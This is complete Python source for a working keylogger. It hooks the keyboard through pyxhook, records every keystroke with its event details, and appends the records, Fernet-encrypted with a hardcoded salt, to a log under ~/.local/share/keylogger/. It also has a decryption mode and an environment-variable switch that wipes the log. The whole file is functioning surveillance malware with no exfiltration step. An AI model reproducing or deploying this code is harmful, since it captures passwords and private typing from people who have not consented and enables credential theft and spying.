
import os
# import pyxhook # Moved to start_logging
import base64
import hashlib
import sys
import argparse # New import
from cryptography.fernet import Fernet

# --- Global configurations ---
# Using a fixed salt for simplicity. WARNING: Not for production.
SALT = b'keylogger_fixed_salt_#sP1@'
DEFAULT_LOG_FILE = os.path.expanduser('~/.local/share/keylogger/file.log')

# --- Core Functions ---
def generate_fernet_key(password: str, salt: bytes) -> bytes:
    """Generates a Fernet-compatible key from a password and salt."""
    kdf = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        100000,  # Iterations
        dklen=32  # 32 bytes for Fernet key
    )
    return base64.urlsafe_b64encode(kdf)

def get_cipher_suite(password: str, salt: bytes) -> Fernet:
    """Generates and returns a Fernet cipher suite."""
    if not password:
        # This case should be caught by the initial check in main(),
        # but as a safeguard in the function:
        raise ValueError("Password cannot be empty for cipher generation.")
    try:
        encryption_key = generate_fernet_key(password, salt)
        return Fernet(encryption_key)
    except Exception as e:
        # Wrap the original exception for better context
        raise Exception(f"Error initializing encryption cipher: {e}") from e

# --- Decryption Mode ---
def decrypt_log_file(encrypted_file_path: str, cipher: Fernet):
    """Reads an encrypted log file, decrypts each line, and prints it."""
    try:
        with open(encrypted_file_path, 'rb') as f:
            for line_number, line in enumerate(f, 1):
                stripped_line = line.strip()
                if not stripped_line:  # Skip empty lines
                    continue
                try:
                    decrypted_data = cipher.decrypt(stripped_line)
                    print(decrypted_data.decode('utf-8'))
                except Exception as e:
                    print(f"Error decrypting line {line_number} in '{encrypted_file_path}': {e}. "
                          "Line may be corrupted, not encrypted, or password may be incorrect.", file=sys.stderr)
    except FileNotFoundError:
        print(f"Error: Encrypted log file not found at '{encrypted_file_path}'", file=sys.stderr)
        sys.exit(1) # Exit if specified file for decryption is not found
    except Exception as e:
        print(f"An unexpected error occurred during decryption: {e}", file=sys.stderr)
        sys.exit(1)

# --- Logging Mode ---
# Global variables for the logger's cipher and log file path.
# These are set in main() when switching to logging mode.
logger_cipher_suite: Fernet = None
logger_file_log: str = None

def OnKeyPress(event):
    """Callback for key press events. Encrypts and logs the event."""
    global logger_cipher_suite, logger_file_log

    if not logger_cipher_suite or not logger_file_log:
        # This should not happen if initialization in main() is correct.
        print("Critical Error: Logger not properly initialized.", file=sys.stderr)
        return

    try:
        log_entry = f'{event.Key} {event}'
        encrypted_data = logger_cipher_suite.encrypt(log_entry.encode('utf-8'))
        with open(logger_file_log, 'ab') as f:  # Append bytes mode
            f.write(encrypted_data + b'\n')  # Add a newline for separation
    except Exception as e:
        # Avoid writing raw data or detailed errors to the log in this state.
        print(f"Error during logging keystroke: {e}", file=sys.stderr)

def setup_logging_environment(log_file_path: str):
    """Ensures log directory and file exist with correct permissions, handles cleaning."""
    # Ensure the log directory exists and set permissions
    log_dir = os.path.dirname(log_file_path)
    os.makedirs(log_dir, mode=0o700, exist_ok=True) # exist_ok=True is important

    # Handle pylogger_clean: remove the log file if env var is set
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            if os.path.exists(log_file_path):
                os.remove(log_file_path)
        except EnvironmentError as e:
            print(f"Warning: Could not remove log file during pylogger_clean: {e}", file=sys.stderr)
            # Continue, as we'll try to create/set permissions next

    # Ensure log file exists and set its permissions
    if not os.path.exists(log_file_path):
        # Create the file if it doesn't exist
        try:
            with open(log_file_path, 'ab') as f: # Open in bytes mode to be consistent
                pass
            os.chmod(log_file_path, 0o600)
        except OSError as e:
            print(f"Error: Could not create or set permissions for log file {log_file_path}: {e}", file=sys.stderr)
            sys.exit(1) # Exit if we can't setup the log file
    else:
        # Ensure existing file has correct permissions
        try:
            os.chmod(log_file_path, 0o600)
        except OSError as e:
            print(f"Warning: Could not set permissions for existing log file {log_file_path}: {e}", file=sys.stderr)


def start_logging(cipher: Fernet, log_file_path: str):
    """Initializes and starts the keylogger."""
    global logger_cipher_suite, logger_file_log
    logger_cipher_suite = cipher
    logger_file_log = log_file_path

    setup_logging_environment(logger_file_log)

    # Optional: cancel_key logic can be re-added if needed.
    # For now, it's removed for simplicity.
    # cancel_key = os.environ.get('pylogger_cancel', '')
    # if cancel_key:
    #     print(f"Cancel key is set to: {cancel_key}")

    import pyxhook # Import pyxhook only when starting logging
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()

    print(f"Starting keylogger. Logging to: {logger_file_log}")
    print("Press Ctrl+C to stop.") # Standard way to stop

    try:
        new_hook.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as ex:
        # This is for errors from new_hook.start() itself or unhandled exceptions in OnKeyPress
        msg = f'Critical error in keylogger hook: {ex}'
        print(msg, file=sys.stderr)
        # Attempt to log the final error message, encrypted.
        try:
            if logger_cipher_suite and logger_file_log:
                error_log_entry = f"FATAL_HOOK_ERROR: {msg}".encode('utf-8')
                encrypted_error = logger_cipher_suite.encrypt(error_log_entry)
                with open(logger_file_log, 'ab') as f:
                    f.write(encrypted_error + b'\n')
        except Exception as final_log_ex:
            print(f"Additionally, failed to write fatal error to log: {final_log_ex}", file=sys.stderr)

# --- Main Execution ---
def main():
    parser = argparse.ArgumentParser(description="Keylogger utility with encryption and decryption modes.")
    parser.add_argument(
        '--decrypt',
        metavar='FILEPATH',
        type=str,
        help="Path to the encrypted log file to decrypt. If provided, the script runs in decryption mode."
    )

    args = parser.parse_args()

    password = os.environ.get('KEYLOGGER_PASSWORD')
    if not password:
        print("Error: KEYLOGGER_PASSWORD environment variable not set. This is required for both logging and decryption.", file=sys.stderr)
        sys.exit(1)

    try:
        # Initialize cipher suite once, used by both modes.
        cipher = get_cipher_suite(password, SALT)
    except Exception as e:
        # get_cipher_suite already formats the error message.
        print(f"{e}", file=sys.stderr)
        sys.exit(1)

    if args.decrypt:
        # Decryption Mode
        print(f"Attempting to decrypt file: '{args.decrypt}'")
        decrypt_log_file(args.decrypt, cipher)
    else:
        # Logging Mode (default)
        # Determine log file path (environment variable or default)
        log_file = os.environ.get('pylogger_file', DEFAULT_LOG_FILE)
        start_logging(cipher, log_file)

if __name__ == '__main__':
    main()
